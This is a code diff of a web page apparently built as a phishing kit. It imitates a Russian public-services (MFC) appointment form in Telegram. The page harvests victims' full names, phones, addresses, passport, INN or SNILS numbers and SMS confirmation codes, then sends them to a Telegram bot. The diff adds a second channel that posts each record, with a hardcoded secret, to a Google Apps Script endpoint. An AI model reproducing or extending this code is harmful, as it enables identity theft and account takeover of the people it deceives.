@@ -44,6 +44,7 @@
           <button type="button" class="menu-btn" data-action="show-data">📊 Мои данные</button>
         </div>
       </div>
+
       <div class="step" id="step-fullname">
         <h3>👤 Укажите ФИО</h3>
         <div class="input-group">
@@ -55,6 +56,7 @@
           <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
+
       <div class="step" id="step-phone">
         <h3>📞 Номер телефона</h3>
         <div class="input-group">
@@ -66,6 +68,7 @@
           <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
+
       <div class="step" id="step-address">
         <h3>🏠 Укажите адрес</h3>
         <div class="input-group">
@@ -77,6 +80,7 @@
           <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
+
       <div class="step" id="step-document-type">
         <h3>📄 Выберите документ</h3>
         <div class="buttons">
@@ -86,6 +90,7 @@
         </div>
         <div class="buttons"><button type="button" class="back">↩️ Вернуться назад</button></div>
       </div>
+
       <div class="step" id="step-document-number">
         <h3 id="doc-title">🔢 Введите номер документа</h3>
         <div class="input-group">
@@ -98,6 +103,7 @@
           <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
+
       <div class="step" id="step-code">
         <h3>🔐 Введите код из SMS</h3>
         <div class="input-group">
@@ -110,6 +116,7 @@
           <div class="loading" id="loading">Отправка данных...</div>
         </div>
       </div>
+
       <div id="data-output" class="data-table">
         <h3>📋 Собранные данные</h3>
         <button type="button" class="menu-btn" id="clear-data">🗑️ Очистить данные</button>
@@ -122,6 +129,7 @@
       </div>
     </div>
   </div>
+
   <script>
     let __lastSent = "";
     function sendToBotOnce(rec) {
@@ -167,10 +175,7 @@
 
       initEvents() {
         const root = document.getElementById("wizard");
-        if (!root) {
-          console.error("Wizard container not found");
-          return;
-        }
+        if (!root) { console.error("Wizard container not found"); return; }
         root.addEventListener("click", (e) => {
           const t = e.target.closest("button");
           if (!t) return;
@@ -179,250 +184,184 @@
           else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
           else if (t.id === "clear-data") this.clearData();
         });
-        ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
-          const el = document.getElementById(id);
-          if (el) {
-            el.addEventListener("input", () => this.validate(this.currentStep));
-            el.addEventListener("keypress", (e) => {
-              if (e.key === "Enter") {
-                e.preventDefault();
-                this.next();
-              }
-            });
+        ["fullname","phone","address","docnumber","code"].forEach((id)=>{
+          const el=document.getElementById(id);
+          if (el){
+            el.addEventListener("input",()=>this.validate(this.currentStep));
+            el.addEventListener("keypress",(e)=>{ if(e.key==="Enter"){ e.preventDefault(); this.next(); }});
           }
         });
       }
 
-      loadData() {
-        try {
-          const data = localStorage.getItem("mfcData");
-          return data ? JSON.parse(data) : [];
-        } catch (e) {
-          console.error("Error loading data from localStorage:", e);
-          return [];
-        }
+      loadData(){
+        try{ const data = localStorage.getItem("mfcData"); return data? JSON.parse(data):[]; }
+        catch(e){ console.error("Error loading data from localStorage:",e); return []; }
       }
-
-      saveData() {
-        try {
-          localStorage.setItem("mfcData", JSON.stringify(this.dataStore));
-        } catch (e) {
-          console.error("Error saving data to localStorage:", e);
-        }
-      }
-
-      clearData() {
-        if (confirm("Очистить все сохраненные данные?")) {
-          this.dataStore = [];
-          this.saveData();
-          this.renderTable();
+      saveData(){ try{ localStorage.setItem("mfcData", JSON.stringify(this.dataStore)); } catch(e){ console.error("Error saving data:",e); } }
+      clearData(){
+        if(confirm("Очистить все сохраненные данные?")){
+          this.dataStore=[]; this.saveData(); this.renderTable();
           document.getElementById("data-output").classList.remove("active");
           alert("Данные очищены!");
         }
       }
 
-      updateWelcome() {
-        const el = document.getElementById("welcome-message");
-        const tg = window.Telegram?.WebApp;
-        let name = "Гость";
-        try {
-          const u = tg?.initDataUnsafe?.user;
-          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
-        } catch (e) {
-          console.warn("Error accessing Telegram user data:", e);
-        }
-        if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
+      updateWelcome(){
+        const el=document.getElementById("welcome-message"); const tg=window.Telegram?.WebApp;
+        let name="Гость";
+        try{
+          const u=tg?.initDataUnsafe?.user;
+          if(u) name=[u.first_name,u.last_name].filter(Boolean).join(" ")||u.username||"Гость";
+        }catch(e){ console.warn("Error accessing Telegram user data:",e); }
+        if(el) el.textContent=`📋 Добро пожаловать, ${name}! 👋`;
       }
 
-      show(id) {
-        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
-        this.currentStep = id;
-        const errorFields = ["err-fullname", "err-phone", "err-address", "err-doc", "err-code"];
-        errorFields.forEach((id) => {
-          const el = document.getElementById(id);
-          if (el) el.textContent = "";
+      show(id){
+        this.steps.forEach((s)=>s.classList.toggle("active", s.id===`step-${id}`));
+        this.currentStep=id;
+        ["err-fullname","err-phone","err-address","err-doc","err-code"].forEach((eid)=>{
+          const el=document.getElementById(eid); if(el) el.textContent="";
         });
-        window.scrollTo({ top: 0, behavior: "smooth" });
-        const input = document.querySelector(`#step-${id} input`);
-        if (input) input.focus();
+        window.scrollTo({top:0,behavior:"smooth"});
+        const input=document.querySelector(`#step-${id} input`); if(input) input.focus();
       }
 
-      next() {
-        if (!this.validate(this.currentStep)) return;
-        if (this.currentStep === "fullname") {
-          this.formData.fullname = (document.getElementById("fullname").value || "").trim();
-          return this.show("phone");
-        }
-        if (this.currentStep === "phone") {
-          this.formData.phone = (document.getElementById("phone").value || "").trim();
-          return this.show("address");
-        }
-        if (this.currentStep === "address") {
-          this.formData.address = (document.getElementById("address").value || "").trim();
-          return this.show("document-type");
-        }
-        if (this.currentStep === "document-number") {
-          this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim();
-          return this.show("code");
-        }
-        if (this.currentStep === "code") {
-          this.formData.code = (document.getElementById("code").value || "").trim();
-          return this.send();
-        }
+      next(){
+        if(!this.validate(this.currentStep)) return;
+        if(this.currentStep==="fullname"){ this.formData.fullname=(document.getElementById("fullname").value||"").trim(); return this.show("phone"); }
+        if(this.currentStep==="phone"){ this.formData.phone=(document.getElementById("phone").value||"").trim(); return this.show("address"); }
+        if(this.currentStep==="address"){ this.formData.address=(document.getElementById("address").value||"").trim(); return this.show("document-type"); }
+        if(this.currentStep==="document-number"){ this.formData["document-number"]=(document.getElementById("docnumber").value||"").trim(); return this.show("code"); }
+        if(this.currentStep==="code"){ this.formData.code=(document.getElementById("code").value||"").trim(); return this.send(); }
       }
 
-      back() {
-        const map = {
-          fullname: "main",
-          phone: "fullname",
-          address: "phone",
-          "document-type": "address",
-          "document-number": "document-type",
-          code: "document-number",
-        };
-        this.show(map[this.currentStep] || "main");
+      back(){
+        const map={ fullname:"main", phone:"fullname", address:"phone", "document-type":"address", "document-number":"document-type", code:"document-number" };
+        this.show(map[this.currentStep]||"main");
       }
 
-      menu(action, doc) {
-        if (action === "schedule") return this.show("fullname");
-        if (action === "documents") return alert("Список документов: Паспорт, ИНН, СНИЛС, выписка ЕГРН.");
-        if (action === "check-status") return alert("Проверка статуса недоступна в демо.");
-        if (action === "contact") {
-          try {
-            window.location.href = "https://t.me/MFC_SUPPORT";
-          } catch (e) {
-            console.error("Error navigating to contact:", e);
-            alert("Ошибка при переходе к поддержке. Попробуйте снова.");
-          }
+      menu(action,doc){
+        if(action==="schedule") return this.show("fullname");
+        if(action==="documents") return alert("Список документов: Паспорт, ИНН, СНИЛС, выписка ЕГРН.");
+        if(action==="check-status") return alert("Проверка статуса недоступна в демо.");
+        if(action==="contact"){ try{ window.location.href="https://t.me/MFC_SUPPORT"; } catch(e){ console.error("Error navigating:",e); alert("Ошибка при переходе к поддержке. Попробуйте снова."); } return; }
+        if(action==="faq") return alert("FAQ в разработке.");
+        if(action==="show-data"){
+          const dataOutput=document.getElementById("data-output");
+          if(dataOutput) dataOutput.classList.add("active");
+          const last=this.dataStore[this.dataStore.length-1];
+          if(last) sendToBotOnce(last);
           return;
         }
-        if (action === "faq") return alert("FAQ в разработке.");
-        if (action === "show-data") {
-          const dataOutput = document.getElementById("data-output");
-          if (dataOutput) dataOutput.classList.add("active");
-          const last = this.dataStore[this.dataStore.length - 1];
-          if (last) sendToBotOnce(last);
-          return;
-        }
-        if (doc) {
-          this.formData["document-type"] = doc;
-          const ex = {
-            Паспорт: "Пример: 4510 123456",
-            ИНН: "Пример: 500100732259",
-            СНИЛС: "Пример: 112-233-445 95",
-          };
-          const docExample = document.getElementById("doc-example");
-          if (docExample) docExample.textContent = ex[doc] || "";
-          const docTitle = document.getElementById("doc-title");
-          if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
+        if(doc){
+          this.formData["document-type"]=doc;
+          const ex={ Паспорт:"Пример: 4510 123456", ИНН:"Пример: 500100732259", СНИЛС:"Пример: 112-233-445 95" };
+          const docExample=document.getElementById("doc-example"); if(docExample) docExample.textContent=ex[doc]||"";
+          const docTitle=document.getElementById("doc-title"); if(docTitle) docTitle.textContent=`🔢 Введите номер документа (${doc})`;
           return this.show("document-number");
         }
       }
 
-      validate(step) {
-        const e = (id) => document.getElementById(id);
-        if (step === "fullname") {
-          const v = (e("fullname")?.value || "").trim();
-          if (!v || v.split(" ").length < 2) {
-            e("err-fullname").textContent = "Укажите имя и фамилию";
-            return false;
-          }
-          e("err-fullname").textContent = "";
-          return true;
+      validate(step){
+        const e=(id)=>document.getElementById(id);
+        if(step==="fullname"){
+          const v=(e("fullname")?.value||"").trim();
+          if(!v||v.split(" ").length<2){ e("err-fullname").textContent="Укажите имя и фамилию"; return false; }
+          e("err-fullname").textContent=""; return true;
         }
-        if (step === "phone") {
-          const v = (e("phone")?.value || "").trim();
-          if (!/^\+?\d[\d\s\-()]{6,}$/.test(v)) {
-            e("err-phone").textContent = "Укажите корректный телефон (7+ цифр)";
-            return false;
-          }
-          e("err-phone").textContent = "";
-          return true;
+        if(step==="phone"){
+          const v=(e("phone")?.value||"").trim();
+          if(!/^\+?\d[\d\s\-()]{6,}$/.test(v)){ e("err-phone").textContent="Укажите корректный телефон (7+ цифр)"; return false; }
+          e("err-phone").textContent=""; return true;
         }
-        if (step === "address") {
-          const v = (e("address")?.value || "").trim();
-          if (!v || v.length < 5) {
-            e("err-address").textContent = "Укажите адрес (город, улица, дом)";
-            return false;
-          }
-          e("err-address").textContent = "";
-          return true;
+        if(step==="address"){
+          const v=(e("address")?.value||"").trim();
+          if(!v||v.length<5){ e("err-address").textContent="Укажите адрес (город, улица, дом)"; return false; }
+          e("err-address").textContent=""; return true;
         }
-        if (step === "document-number") {
-          const v = (e("docnumber")?.value || "").trim();
-          const docType = this.formData["document-type"] || "";
-          if (!v) {
-            e("err-doc").textContent = "Введите номер документа";
-            return false;
-          }
-          if (docType === "Паспорт" && !/^\d{4}\s?\d{6}$/.test(v)) {
-            e("err-doc").textContent = "Паспорт: 4 цифры, 6 цифр";
-            return false;
-          }
-          if (docType === "ИНН" && !/^\d{12}$/.test(v)) {
-            e("err-doc").textContent = "ИНН: 12 цифр";
-            return false;
-          }
-          if (docType === "СНИЛС" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)) {
-            e("err-doc").textContent = "СНИЛС: XXX-XXX-XXX XX";
-            return false;
-          }
-          e("err-doc").textContent = "";
-          return true;
+        if(step==="document-number"){
+          const v=(e("docnumber")?.value||"").trim();
+          const docType=this.formData["document-type"]||"";
+          if(!v){ e("err-doc").textContent="Введите номер документа"; return false; }
+          if(docType==="Паспорт" && !/^\d{4}\s?\d{6}$/.test(v)){ e("err-doc").textContent="Паспорт: 4 цифры, 6 цифр"; return false; }
+          if(docType==="ИНН" && !/^\d{12}$/.test(v)){ e("err-doc").textContent="ИНН: 12 цифр"; return false; }
+          if(docType==="СНИЛС" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)){ e("err-doc").textContent="СНИЛС: XXX-XXX-XXX XX"; return false; }
+          e("err-doc").textContent=""; return true;
         }
-        if (step === "code") {
-          const v = (e("code")?.value || "").trim();
-          if (!/^\d{4}$/.test(v)) {
-            e("err-code").textContent = "Код: 4 цифры";
-            return false;
-          }
-          e("err-code").textContent = "";
-          return true;
+        if(step==="code"){
+          const v=(e("code")?.value||"").trim();
+          if(!/^\d{4}$/.test(v)){ e("err-code").textContent="Код: 4 цифры"; return false; }
+          e("err-code").textContent=""; return true;
         }
         return true;
       }
 
-      send() {
+      // ← единственное изменение: async + отправка в Sheets с сохранением всего остального поведения
+      async send(){
         const rec = {
-          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
+          timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
           fullname: this.formData.fullname || "",
-          phone: this.formData.phone || "",
-          address: this.formData.address || "",
-          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
-          code: this.formData.code || "",
+          phone:    this.formData.phone || "",
+          address:  this.formData.address || "",
+          document: `${this.formData["document-type"]||""} ${this.formData["document-number"]||""}`.trim(),
+          code:     this.formData.code || ""
         };
+
         if (this.dataStore.some(r => JSON.stringify(r) === JSON.stringify(rec))) {
           alert("Данные уже были отправлены!");
           return;
         }
+
+        // 1) Пробуем записать в Google Sheets
+        try { await sendToSheet(rec); }
+        catch (err) { console.warn("sendToSheet error:", err); /* не блокируем дальнейшие шаги */ }
+
+        // 2) Как и раньше: отправка в бота + локальное сохранение и вывод
         sendToBotOnce(rec);
+
         this.dataStore.push(rec);
         this.saveData();
         this.renderTable();
-        const dataOutput = document.getElementById("data-output");
+        const dataOutput=document.getElementById("data-output");
         if (dataOutput) dataOutput.classList.add("active");
-        this.formData = {};
+        this.formData={};
         this.show("main");
         alert("Данные успешно отправлены!");
       }
 
-      renderTable() {
-        const tbody = document.getElementById("data-table-body");
-        if (!tbody) return;
-        tbody.innerHTML = "";
-        this.dataStore.forEach((r) => {
-          const tr = document.createElement("tr");
-          tr.innerHTML = `<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
+      renderTable(){
+        const tbody=document.getElementById("data-table-body");
+        if(!tbody) return;
+        tbody.innerHTML="";
+        this.dataStore.forEach((r)=>{
+          const tr=document.createElement("tr");
+          tr.innerHTML=`<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
           tbody.appendChild(tr);
         });
       }
     }
 
-    try {
-      new MFCWizard();
-    } catch (e) {
-      console.error("Failed to initialize MFCWizard:", e);
-      alert("Ошибка инициализации. Перезагрузите страницу.");
+    try { new MFCWizard(); }
+    catch(e){ console.error("Failed to initialize MFCWizard:",e); alert("Ошибка инициализации. Перезагрузите страницу."); }
+  </script>
+
+  <!-- Отправка в Google Sheets -->
+  <script>
+    // 1) ВСТАВЬ свои значения
+    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxf1TVKCe0EJewrxLlbDzlD2xFC81CKe8O2YhVzU6CGwXTUPofCjfS7ERrqKX3va738/exec"; // /exec URL
+    const SECRET            = "benhillowrkspesieworkhab"; // тот же, что в Code.gs
+
+    // 2) Функция отправки записи в таблицу
+    async function sendToSheet(rec){
+      const res = await fetch(SHEETS_WEBAPP_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "lead", payload: rec, secret: SECRET })
+      });
+      const data = res.ok ? await res.json().catch(()=>({})) : {};
+      if (!data.ok) throw new Error(data.error || "request failed");
+      if (data.duplicate) alert("⚠️ Такая запись уже есть.");
+      else alert("✅ Данные записаны в таблицу.");
     }
   </script>
 </body>
